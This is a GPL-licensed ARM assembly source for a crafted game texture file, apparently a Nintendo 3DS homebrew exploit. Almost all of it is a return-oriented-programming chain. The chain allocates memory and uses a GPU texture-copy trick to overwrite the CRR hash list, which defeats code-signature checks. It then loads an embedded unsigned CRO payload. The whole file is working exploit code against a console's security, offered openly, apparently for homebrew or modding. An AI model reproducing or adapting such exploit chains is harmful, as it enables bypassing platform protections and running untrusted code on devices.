/*
Copyright 2016 Seth VanHeulen

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "constants.h"

    .word 0x584554
    .word 0xa6
    .word MIPMAP_COUNT
    .word TEXTURE_COUNT

.org MTFILEREADER_INSTANCE, 0
    .word 0
    .word NULLSUB_PTR_PTR
    .word 0
    .word 0
    .word 0
    .word 0

.org ROP_START, 0
    // malloc linear for crr patch
    .word ROP_POP_R0PC
        .word MTEXHEAPALLOCATOR_INSTANCE_PTR
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word ROP_LDR_R0R0_BX_LR // this
    .word ROP_POP_R1R2R3PC
        .word CRR_HASH_COUNT*0x20 // size
        .word 0x1000 // alignment
        .word 0
    .word MTEXHEAPALLOCATOR_MALLOC

    // backup crr patch linear address
    .word ROP_POP_R1PC
        .word ROP_POP_PC
    .word ROP_MOV_R5R0_BLX_R1

    // memcopy crr patch from stack to linear
    .word ROP_POP_R1R2R3PC
        .word (_payload_cro_end-CRR_HASH_COUNT*0x20)-_memcpy_crr_patch_sp
        .word CRR_HASH_COUNT*0x20 // size
        .word ROP_POP_PC
    .word ROP_MOV_R0SP_BLX_R3
_memcpy_crr_patch_sp:
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word ROP_ADD_R0R0R1_BX_LR
    .word ROP_POP_R1PC
        .word ROP_POP_PC
    .word ROP_MOV_R6R0_BLX_R1
    .word ROP_MOV_R0R5_BLX_R1 // dst
    .word ROP_MOV_R1R6_BLX_R3 // src
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word MEMCPY

    // flush data cache for crr patch
    .word ROP_POP_R1PC
        .word ROP_POP_PC
    .word ROP_MOV_R0R5_BLX_R1 // addr
    .word ROP_POP_R1PC
        .word CRR_HASH_COUNT*0x20 // size
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word GSPGPU_FLUSHDATACACHE

    // gspwn crr patch to crr
    .word ROP_POP_R1PC
        .word ROP_POP_PC
    .word ROP_MOV_R0R5_BLX_R1 // src
    .word ROP_POP_R1R2R3PC
        .word CRR_START_LINEAR+0x360 // dst
        .word CRR_HASH_COUNT*0x20 // size
        .word 0 // input dimensions
    .word ROP_POP_LRPC
        .word ROP_ADD_SPSP16_POP_PC
    .word GX_TEXTURECOPY
        .word 0 // output dimentions
        .word 0 // unknown
        .word 0 // unknown
        .word 8 // flags

    // sleep while gpswn completes
    .word ROP_POP_R0PC
        .word 0x1000000 // nanoseconds (low)
    .word ROP_POP_R1PC
        .word 0 // nanoseconds (high)
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word SVC_SLEEPTHREAD

    // malloc heap for payload cro
    .word ROP_POP_R0PC
        .word MTCTRHEAPALLOCATOR_INSTANCE_PTR // this
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word ROP_LDR_R0R0_BX_LR
    .word ROP_POP_R1R2R3PC
        .word _payload_cro_end-_payload_cro_start // size
        .word 0x1000 // alignment
        .word 0
    .word MTCTRHEAPALLOCATOR_MALLOC

    // backup payload cro heap address
    .word ROP_POP_R1PC
        .word ROP_POP_PC
    .word ROP_MOV_R5R0_BLX_R1

    // memcopy payload cro from stack to heap
    .word ROP_POP_R1R2R3PC
        .word _payload_cro_start-_memcpy_payload_cro_sp
        .word _payload_cro_end-_payload_cro_start // size
        .word ROP_POP_PC
    .word ROP_MOV_R0SP_BLX_R3
_memcpy_payload_cro_sp:
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word ROP_ADD_R0R0R1_BX_LR
    .word ROP_POP_R1PC
        .word ROP_POP_PC
    .word ROP_MOV_R6R0_BLX_R1
    .word ROP_MOV_R0R5_BLX_R1 // dst
    .word ROP_MOV_R1R6_BLX_R3 // src
    .word ROP_POP_LRPC
        .word ROP_POP_PC
    .word MEMCPY

    // load payload cro
    .word ROP_POP_R1PC
        .word ROP_POP_PC
    .word ROP_MOV_R0R5_BLX_R1 // cro addr
    .word ROP_POP_R1R2R3PC
        .word _payload_cro_end-_payload_cro_start // cro size
        .word 0 // .data+.bss addr
        .word 0 // .data+.bss size
    .word ROP_POP_LRPC
        .word ROP_ADD_SPSP12_POP_PC
    .word LDRRO_LOADCRO
        .word 1 // auto-link
        .word 1 // fix level
        .word 0 // unknown

    // exit if the payload fails to load
    .word SVC_EXITPROCESS

_payload_cro_start:
.incbin CRO_FILE_PATH
_payload_cro_end:

.org TEX_FILE_SIZE

